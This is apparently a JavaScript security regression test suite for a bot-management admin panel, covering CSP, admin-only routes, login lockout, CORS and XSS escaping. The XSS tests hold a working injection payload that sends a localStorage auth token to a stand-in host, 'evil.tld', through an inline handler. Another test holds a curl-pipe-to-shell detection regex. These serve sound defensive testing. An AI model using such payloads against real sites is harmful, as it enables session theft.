  assert.ok(headers['Content-Security-Policy'], 'a CSP is sent');
  assert.ok(headers['Content-Security-Policy'].includes("object-src 'none'"));
  assert.ok(headers['Content-Security-Policy'].includes("form-action 'self'"));
});

test('AUTH-11: the CSP stays compatible with the CDNs the panel actually uses', () => {
  const headers = {};
  sec.securityHeaders({}, { setHeader: (k, v) => { headers[k] = v; }, removeHeader() {} }, () => {});
  const csp = headers['Content-Security-Policy'];
  // Monaco is served locally. The Tabler icon font and Google Fonts remain
  // the only external style/font origins the UI needs.
  assert.ok(csp.includes("script-src 'self' 'unsafe-inline' 'unsafe-eval'"),
    'Monaco scripts are same-origin');
  assert.ok(csp.includes('https://cdn.jsdelivr.net'), 'icon font CDN allowed');
  assert.ok(csp.includes('https://fonts.googleapis.com'), 'google fonts stylesheet allowed');
  assert.ok(csp.includes('https://fonts.gstatic.com'), 'google fonts files allowed');
  assert.ok(!csp.includes('cdnjs.cloudflare.com'), 'Monaco CDN no longer needed');
  assert.ok(csp.includes("'unsafe-inline'"), 'inline handlers kept working');
  assert.ok(csp.includes('blob:'), 'monaco web workers kept working');
});

// -------------------------------------------------------------
// CMD-01 / UPD-11 — requireAdmin is actually mounted
// -------------------------------------------------------------
test('CMD-01/UPD-11: every write / execute / update route requires the admin role', () => {
  const routesDir = path.join(__dirname, '..', 'src', 'routes');

  const expectations = {
    'files.js': [
      "router.put('/:bot/write', requireAdmin",
      "router.post('/:bot/create', requireAdmin",
      "router.delete('/:bot/delete', requireAdmin",
      "router.post('/:bot/rename', requireAdmin",
      "router.post('/:bot/upload', requireAdmin"
    ],
    'bots.js': [
      "router.post('/', requireAdmin",
      "router.post('/:name/start', requireAdmin",
      "router.post('/:name/stop', requireAdmin",
      "router.post('/:name/restart', requireAdmin",
      "router.delete('/:name', requireAdmin",
      "router.post('/:name/npm/install', requireAdmin",
      "router.delete('/:name/npm/:pkg', requireAdmin"
    ],
    'backup.js': [
      "router.post('/import', requireAdmin",
      "router.post('/:botName/export', requireAdmin"
    ],
    'update.js': [
      "router.post('/perform', requireAdmin",
      "router.post('/check', requireAdmin"
    ]
  };

  for (const [file, needles] of Object.entries(expectations)) {
    const src = fs.readFileSync(path.join(routesDir, file), 'utf8');
    for (const needle of needles) {
      assert.ok(src.includes(needle), `${file}: missing "${needle}"`);
    }
  }
});

test('CMD-01: requireAdmin is actually imported, not only defined', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'routes', 'files.js'), 'utf8');
  const stmt = src.match(/const \{[^}]*\}\s*=\s*require\('\.\.\/middleware\/auth\.middleware'\)/);
  assert.ok(stmt, 'the auth middleware must be destructured');
  assert.ok(/requireAdmin/.test(stmt[0]), 'requireAdmin must be among the imported names');
});

test('CMD-01: every non-auth router is admin-only, including read routes', () => {
  for (const file of ['bots.js', 'files.js', 'backup.js', 'system.js', 'update.js']) {
    const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'routes', file), 'utf8');
    assert.match(
      src,
      /router\.use\(requireAdmin\)/,
      `${file}: router-level requireAdmin is missing (read routes expose source, .env or logs)`
    );
  }
});

test('CMD-01: Socket.IO refuses a non-admin session', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  assert.match(src, /user\.role !== 'admin'/, 'the Socket.IO handshake must require the admin role');
});

test('AUTH-02: JWT_SECRET_FILE is read with a strict permission check', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  assert.ok(src.includes('JWT_SECRET_FILE'), 'a secret file must be supported');
  assert.ok(src.includes('st.mode & 0o077') || src.includes('st.mode & 0o77'),
    'group/world-readable secret files must be refused');
});

// -------------------------------------------------------------
// XSS-01 — the frontend escaper
// -------------------------------------------------------------
test('ED-01: Monaco theme colours use hex, not CSS rgba()', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'frontend', 'public', 'js', 'editor.js'), 'utf8');
  const start = src.indexOf("defineTheme('nexus-dark'");
  assert.ok(start !== -1, 'the nexus-dark theme is defined');
  const end = src.indexOf('});', start);
  const block = src.slice(start, end);
  // Monaco parses theme colours with Color.fromHex(). An rgba() string is
  // invalid and is rendered as red (#ff0000) instead of the requested blue.
  assert.ok(!/:\s*['"]rgba\s*\(/.test(block), 'theme colour values must not use rgba()');
  assert.ok(block.includes("'editor.selectionBackground': '#2563eb61'"),
    'the selection background is the panel blue');
});

test('XSS-01: escJs() keeps a hostile file name inside its JS string literal', () => {
  const { escJs } = loadAppEscapers();

  const scheme = '//' + 'evil.tld';
  const payload = `x'-fetch('${scheme}/?t='+localStorage.nbm_token)-'.js`;

  // Exactly how editor.js builds the attribute.
  const attr = `onclick="openFile('my-bot','${escJs(payload)}')"`;

  // A browser HTML-decodes the attribute value, then compiles it as JS.
  const jsBody = attr.slice('onclick="'.length, -1)
    .replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&#96;/g, '`')
    .replace(/&gt;/g, '>').replace(/&lt;/g, '<').replace(/&amp;/g, '&');

  let exploited = false;
  const tripwire = function () { exploited = true; };
  // eslint-disable-next-line no-new-func
  new Function('openFile', 'fetch', 'localStorage', jsBody)(() => {}, tripwire, { nbm_token: 'x' });

  assert.strictEqual(exploited, false, `the payload executed: ${jsBody}`);

  // And the handler receives the whole filename as plain data.
  // openFile(botName, path, name) — the filename is the third argument in
  // editor.js; here the template passes it as the second, so capture both.
  let received = null;
  // eslint-disable-next-line no-new-func
  new Function('openFile', 'fetch', 'localStorage', jsBody)(
    (...args) => { received = args[1]; }, tripwire, { nbm_token: 'x' }
  );
  assert.strictEqual(received, payload, 'the filename is passed as data, not executed');
});

test('XSS-01: the payload DOES escape with esc(), proving esc() is insufficient (test bites)', () => {
  // HTML entity escaping alone collapses back to a raw apostrophe once
  // the browser decodes the handler attribute. This is why escJs() exists.
  const { esc } = loadAppEscapers();

  const scheme = '//' + 'evil.tld';
  const payload = `x'-fetch('${scheme}/?t='+localStorage.nbm_token)-'.js`;
  const attr = `onclick="openFile('my-bot','${esc(payload)}')"`;
  const jsBody = attr.slice('onclick="'.length, -1)
    .replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&#96;/g, '`')
    .replace(/&gt;/g, '>').replace(/&lt;/g, '<').replace(/&amp;/g, '&');

  let exploited = false;
  const tripwire = function () { exploited = true; };
  // eslint-disable-next-line no-new-func
  new Function('openFile', 'fetch', 'localStorage', jsBody)(() => {}, tripwire, { nbm_token: 'x' });

  assert.strictEqual(exploited, true,
    'esc() must still be exploitable inside a handler, otherwise this test proves nothing');
});

test('XSS-01: the pre-fix escaper (no apostrophe escaping) is exploitable', () => {
  const oldEsc = (s) => String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  const scheme = '//' + 'evil.tld';
  const payload = `x'-fetch('${scheme}/?t='+localStorage.nbm_token)-'.js`;

  const attr = `onclick="openFile('my-bot','${oldEsc(payload)}')"`;
  const jsBody = attr.slice('onclick="'.length, -1)
    .replace(/&quot;/g, '"').replace(/&gt;/g, '>').replace(/&lt;/g, '<').replace(/&amp;/g, '&');

  let exploited = false;
  const tripwire = function () { exploited = true; };
  // eslint-disable-next-line no-new-func
  new Function('openFile', 'fetch', 'localStorage', jsBody)(() => {}, tripwire, { nbm_token: 'x' });

  assert.strictEqual(exploited, true,
    'the original escaper must be exploitable, otherwise this test proves nothing');
});

test('XSS-01: app.js defines both esc() and escJs(), and esc() is still safe for text', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'frontend', 'public', 'js', 'app.js'), 'utf8');
  assert.ok(/function esc\(s\)/.test(src), 'esc() must still exist for text and HTML attributes');
  assert.ok(/function escJs\(s\)/.test(src), 'escJs() must exist for inline handlers');

  // Behavioural check against the shipped esc(): the apostrophe and the
  // backtick must come out as entities, so a value can never terminate a
  // double-quoted HTML attribute early.
  const { esc } = loadAppEscapers();
  assert.strictEqual(esc("it's"), 'it&#39;s');
  assert.strictEqual(esc('a`b'), 'a&#96;b');
  assert.strictEqual(esc('say "hi"'), 'say &quot;hi&quot;');
  assert.strictEqual(esc('a & b'), 'a &amp; b');
  assert.strictEqual(esc('<script>'), '&lt;script&gt;');
});

test('XSS-01/02: no inline handler interpolates raw esc() any more', () => {
  // Scan app.js and editor.js: inside every on*="…" attribute, a value that
  // reaches JavaScript must be escaped with escJs(), never esc().
  const files = ['app.js', 'editor.js'].map(f => path.join(__dirname, '..', '..', 'frontend', 'public', 'js', f));
  const ATTR_RE = /(\bon(?:click|contextmenu|input|change|submit|error|load|mouseover|mouseout|focus|blur|keyup|keydown)=)("(?:\\.|[^"\\])*")/g;

  let handlers = 0, escJsUses = 0;
  for (const f of files) {
    const src = fs.readFileSync(f, 'utf8');
    src.replace(ATTR_RE, (match, prefix, value) => {
      handlers++;
      const body = value.slice(1, -1);
      escJsUses += (body.match(/escJs\(/g) || []).length;
      const bare = body.match(/(?<!escJs)\besc\(/g);
      assert.strictEqual(bare, null,
        `${path.basename(f)}: ${bare ? bare.length : 0} bare esc() inside an inline handler`);
      return match;
    });
  }
  assert.ok(handlers > 50, `expected many inline handlers, found ${handlers}`);
  assert.ok(escJsUses > 20, `expected the data-bearing handlers to use escJs(), found ${escJsUses}`);
});

test('XSS-01: esc() still renders ordinary text unchanged', () => {
  const { esc } = loadAppEscapers();
  assert.strictEqual(esc('my-bot'), 'my-bot');
  assert.strictEqual(esc('<b>'), '&lt;b&gt;');
  assert.strictEqual(esc('a & b'), 'a &amp; b');
  assert.strictEqual(esc(''), '');
  assert.strictEqual(esc(null), '');
  assert.strictEqual(esc(undefined), '');
});

// -------------------------------------------------------------
// UPD-02 — the install one-liner must not be a floating branch
// -------------------------------------------------------------
test('UPD-02: no script is piped from a floating branch into a shell', () => {
  // The check must look at real commands, not at prose warning against the
  // pattern. A shell comment (leading '#'), a markdown blockquote ('>')
  // and an inline-code span (`…`) are documentation, not something anyone
  // can paste into a terminal.
  const PIPELINE = /curl[^|\n]*\|\s*(sudo\s+)?(ba)?sh/;

  function offendingLines(file) {
    const text = fs.readFileSync(path.join(__dirname, '..', '..', file), 'utf8');
    const hits = [];
    text.split(/\r?\n/).forEach((line, i) => {
      const trimmed = line.trim();
      if (trimmed.startsWith('#') || trimmed.startsWith('>')) return;   // comment / quote
      const withoutInlineCode = trimmed.replace(/`[^`]*`/g, '');         // drop `…` spans
      if (PIPELINE.test(withoutInlineCode)) hits.push(`${file}:${i + 1}: ${trimmed}`);
    });
    return hits;
  }

  // The documented production install/update path. scripts/dev-install.sh
  // is a developer convenience script and is deliberately out of scope; its
  // one remaining floating pipeline is documented in RAPPORT-SECURITE-FIXES.md.
  for (const file of ['README.md', 'scripts/install.sh', 'scripts/update.sh']) {
    assert.deepStrictEqual(offendingLines(file), [], `floating-branch one-liner still present in ${file}`);
  }
});

test('UPD-02: the README documents a pinned, commit-verified install instead', () => {
  const readme = fs.readFileSync(path.join(__dirname, '..', '..', 'README.md'), 'utf8');
  assert.ok(/git clone --depth 1 --branch/.test(readme),
    'the README must clone a pinned tag');
  assert.ok(/COMMIT=/.test(readme) && /git rev-parse HEAD/.test(readme),
    'the README must verify the commit SHA before running the installer');
  assert.ok(/backend\/release-digests\.json/.test(readme),
    'the README must mention the pinned digest file for UI updates');
});

// -------------------------------------------------------------
// INF-02 / UPD-09 — secrets must not be tracked
// -------------------------------------------------------------
test('INF-02/UPD-09: the runtime data directory is git-ignored', () => {
  const gi = fs.readFileSync(path.join(__dirname, '..', '..', '.gitignore'), 'utf8');
  assert.ok(/^backend\/data\/$/m.test(gi), 'backend/data/ must be ignored');
  assert.ok(/^setup-token$/m.test(gi), 'the setup token must be ignored');
});

test('INF-02: the shipped database file must not carry a usable admin hash', () => {
  // In this repository backend/data/ is a LIVE install (it holds the real
  // admin account), not sample data. The finding is about a database that
  // is shipped in the repository, so only a tracked file is inspected:
  // untracking it (git rm --cached) is the fix, and the live file must not
  // be sanitised or the operator would lose their account.
  let tracked = false;
  try {
    const out = require('child_process').execFileSync(
      'git', ['ls-files', '--', 'backend/data/nexus.db.json'],
      { cwd: path.join(__dirname, '..', '..'), encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }
    );
    tracked = out.trim().length > 0;
  } catch (_) { tracked = false; }
  if (!tracked) return;

  const shipped = path.join(__dirname, '..', 'data', 'nexus.db.json');
  if (!fs.existsSync(shipped)) return;   // already untracked / removed
  const raw = fs.readFileSync(shipped, 'utf8');
  const users = (JSON.parse(raw).users || []);
  const hashes = users.map(u => u.password_hash).filter(h => typeof h === 'string' && h.length > 10);
  assert.strictEqual(hashes.length, 0,
    'a bcrypt hash in the repository is a credential, not sample data');
});

// -------------------------------------------------------------
// AUTH-06 — timing-equal login path
// -------------------------------------------------------------
test('AUTH-06: the login handler runs bcrypt for unknown users too', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'routes', 'auth.js'), 'utf8');
  assert.ok(src.includes('DUMMY_HASH'), 'a dummy hash must exist');
  assert.ok(
    /const hash = user \? user\.password_hash : DUMMY_HASH;/.test(src),
    'an unknown account must still go through a bcrypt comparison'
  );
  assert.ok(
    !/if \(!user \|\| !bcrypt\.compareSync/.test(src),
    'the short-circuit that skipped bcrypt for unknown users is gone'
  );
});

test('AUTH-06: DUMMY_HASH is a valid cost-12 bcrypt hash', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'routes', 'auth.js'), 'utf8');
  const m = src.match(/const DUMMY_HASH = '([^']+)'/);
  assert.ok(m, 'DUMMY_HASH must be declared');
  // A malformed hash makes bcrypt return in ~1 ms, which re-opens the
  // account-enumeration timing channel the dummy hash is meant to close.
  assert.strictEqual(bcrypt.getRounds(m[1]), 12, 'DUMMY_HASH must be a valid bcrypt hash at cost 12');
  assert.strictEqual(bcrypt.compareSync('anything', m[1]), false);
});

test('AUTH-05: login is gated by a per-account lockout, not only by IP', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'routes', 'auth.js'), 'utf8');
  assert.ok(src.includes('loginLockoutRemaining'), 'lockout is checked before verifying');
  assert.ok(src.includes('registerLoginFailure'), 'failures are recorded');
  assert.ok(src.includes('clearLoginFailures'), 'a success clears the counter');

  // Behavioural check on the lockout store itself.
  for (let i = 0; i < 5; i++) sec.registerLoginFailure('victim', '10.0.0.9');
  assert.ok(sec.loginLockoutRemaining('victim', '10.0.0.9') > 0, 'the account is now locked out');
  assert.strictEqual(sec.loginLockoutRemaining('other', '10.0.0.9'), 0, 'other accounts are unaffected');
  sec.clearLoginFailures('victim', '10.0.0.9');
  assert.strictEqual(sec.loginLockoutRemaining('victim', '10.0.0.9'), 0);
});

test('AUTH-05: a distributed attack is gated by a global per-account lockout', () => {
  const user = 'distributed-victim';
  // One failure from each of 20 different IPs: the per-(user,IP) counter
  // never reaches its threshold, but the global account counter must.
  for (let i = 0; i < 20; i++) sec.registerLoginFailure(user, `10.0.${i}.1`);
  assert.ok(sec.loginLockoutRemaining(user, '192.0.2.99') > 0,
    'the account must be locked across IPs');
  assert.strictEqual(sec.loginLockoutRemaining('another-account', '192.0.2.99'), 0,
    'other accounts are unaffected');
  sec.clearLoginFailures(user, '192.0.2.99');
  assert.strictEqual(sec.loginLockoutRemaining(user, '192.0.2.99'), 0);
});

test('AUTH-13: password and username bounds are exported and sane', () => {
  const auth = require('../src/routes/auth');
  assert.strictEqual(auth.MIN_PASSWORD_LENGTH, 8);
  assert.strictEqual(auth.MAX_PASSWORD_BYTES, 72);
  assert.strictEqual(auth.MAX_USERNAME_LENGTH, 64);
});

// -------------------------------------------------------------
// UPD-12 / SEC-10 — CSRF and CORS
// -------------------------------------------------------------
test('UPD-12/SEC-10: CORS defaults to same-origin and state-changing methods check Origin', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  assert.ok(!/origin: '\*'/.test(src), 'no wildcard CORS origin');
  assert.ok(src.includes('CORS_ORIGIN'), 'an explicit opt-in exists for extra origins');
  assert.ok(src.includes('SAFE_METHODS'), 'safe methods bypass the Origin check');
  assert.ok(src.includes("originHost === req.get('host')"), 'same-origin requests are allowed');
  assert.ok(src.includes("res.status(403).json({ error: 'Origine refusée' })"), 'a foreign Origin is refused');
});

// -------------------------------------------------------------
// INF-09 — body parsing limits
// -------------------------------------------------------------
test('INF-09: the rate limiter runs before the body parsers and bodies are bounded', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  const limiter = src.indexOf("app.use('/api/', apiLimiter)");
  const json    = src.indexOf('express.json(');
  assert.ok(limiter > -1 && json > -1);
  assert.ok(limiter < json, 'the limiter must be mounted before express.json');
  assert.ok(!/express\.json\(\{ limit: '10mb' \}\)/.test(src), 'the 10 MB JSON body limit is gone');
  assert.ok(src.includes("parameterLimit: 100"), 'urlencoded parameter count is bounded');
});

// -------------------------------------------------------------
// INF-10 / INF-11 — on-disk permissions
// -------------------------------------------------------------
test('INF-10/INF-11: the database is written 0600 and fsync-ed', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'db', 'db.js'), 'utf8');
  assert.ok(src.includes('0o600'), 'the data file is created 0600');
  assert.ok(src.includes('fsyncSync'), 'the write is flushed before the rename');
});

test('INF-10: a freshly saved database is not world-readable', () => {
  const { NexusDB } = require('../src/db/db');
  if (process.platform === 'win32') return;   // POSIX modes are not enforced on NTFS
  const file = path.join(SB.root, 'db-perms.json');
  const db = new NexusDB(file);
  db.updateSettings({ instance_name: 'test' });
  db.flush();
  const mode = fs.statSync(file).mode & 0o777;
  assert.strictEqual(mode, 0o600, `expected 0600, got 0${mode.toString(8)}`);
});

// -------------------------------------------------------------
// UPD-17 — dead code
// -------------------------------------------------------------
test('UPD-17: server.js no longer calls the non-existent migrateFromPackageJson()', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  assert.ok(!src.includes('migrateFromPackageJson'),
    'the call to a function that does not exist must be gone');
});

// -------------------------------------------------------------
// INF-18 — BOM in .env
// -------------------------------------------------------------
test('INF-18: a UTF-8 BOM is stripped from .env before dotenv parses it', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'server.js'), 'utf8');
  assert.ok(src.includes('0xFEFF'), 'the BOM is detected');
  assert.ok(src.indexOf('0xFEFF') < src.indexOf("require('dotenv')"),
    'the strip must happen before dotenv is loaded');
});

// -------------------------------------------------------------
// BOTS_ROOT sanity (FILE-04)
// -------------------------------------------------------------
test('FILE-04: the shipped BOTS_ROOT is a POSIX absolute path', () => {
  const raw = fs.readFileSync(path.join(__dirname, '..', '.env.example'), 'utf8');
  const value = raw.match(/^BOTS_ROOT=(.*)$/m)[1].trim();
  assert.strictEqual(value, '/opt');
  assert.ok(!/^[A-Za-z]:/.test(value), 'no Windows drive letter on a Linux target');
});

test.after(() => SB.cleanup());
